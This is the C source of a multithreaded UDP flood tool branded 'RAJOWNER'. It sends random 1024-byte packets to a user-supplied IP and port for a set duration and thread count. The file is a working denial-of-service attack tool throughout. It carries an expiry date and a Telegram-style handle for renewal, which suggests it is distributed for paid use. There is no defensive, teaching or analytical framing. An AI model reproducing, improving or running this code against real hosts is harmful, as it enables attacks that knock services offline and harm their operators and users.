#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>

void usage() {
    printf("Usage: ./RAJOWNER <IP> <PORT> <TIME> <THREADS> 😲\n");
    exit(1);
}

struct thread_data {
    char *ip;
    int port;
    int duration;
    time_t expiration_time;
};

void print_attack_banner() {
    printf("╔════════════════════════════════════════╗\n");
    printf("║                         RAJ..... PROGRAM               ║\n");
    printf("║                            Copyright (c) 2025            ║\n");
    printf("╚════════════════════════════════════════╝\n");
}

void print_expired_banner() {
    printf("╔════════════════════════════════════════╗\n");
    printf("║                              BINARY EXPIRED!              ║\n");
    printf("║                         Please contact the owner at:       ║\n");
    printf("║                             @RAJOWNER90              ║\n");
    printf("╚════════════════════════════════════════╝\n");
}

// Function to generate a random string payload
void generate_payload(char *buffer, size_t length) {
    const char charset[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    for (size_t i = 0; i < length - 1; i++) {
        buffer[i] = charset[rand() % (sizeof(charset) - 1)];
    }
    buffer[length - 1] = '\0';
}

void *attack(void *arg) {
    struct thread_data *data = (struct thread_data *)arg;
    int sock;
    struct sockaddr_in server_addr;
    time_t endtime;

    char payload[1024];

    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(data->port);
    server_addr.sin_addr.s_addr = inet_addr(data->ip);

    endtime = time(NULL) + data->duration;

    while (time(NULL) <= endtime) {
        // Generate a new payload for each iteration
        generate_payload(payload, sizeof(payload));

        if (sendto(sock, payload, strlen(payload), 0,
                   (const struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
            perror("Send failed");
            close(sock);
            pthread_exit(NULL);
        }
    }

    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        usage();
    }

    char *ip = argv[1];
    int port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    int threads = atoi(argv[4]);

    pthread_t *thread_ids = malloc(threads * sizeof(pthread_t));
    struct thread_data data = {ip, port, duration};

    struct tm expiration_tm = {0};
    expiration_tm.tm_year = 2025 - 1900; 
    expiration_tm.tm_mon = 1; 
    expiration_tm.tm_mday = 15; 
    expiration_tm.tm_hour = 23; 
    expiration_tm.tm_min = 59; 
    expiration_tm.tm_sec = 59; 

    data.expiration_time = mktime(&expiration_tm);

    if (data.expiration_time == -1) {
        perror("Error setting expiration time");
        exit(1);
    }

    // Check if the binary has expired
    if (time(NULL) >= data.expiration_time) {
        print_expired_banner(); 
        exit(1);
    }

    print_attack_banner(); 

    srand(time(NULL));

    for (int i = 0; i < threads; i++) {
        if (pthread_create(&thread_ids[i], NULL, attack, (void *)&data) != 0) {
            perror("Thread creation failed");
            free(thread_ids);
            exit(1);
        }
    }

    for (int i = 0; i < threads; i++) {
        pthread_join(thread_ids[i], NULL);
    }

    free(thread_ids);

    printf("Attack finished Made By @RAJOWNER90\n");
    return 0;
}

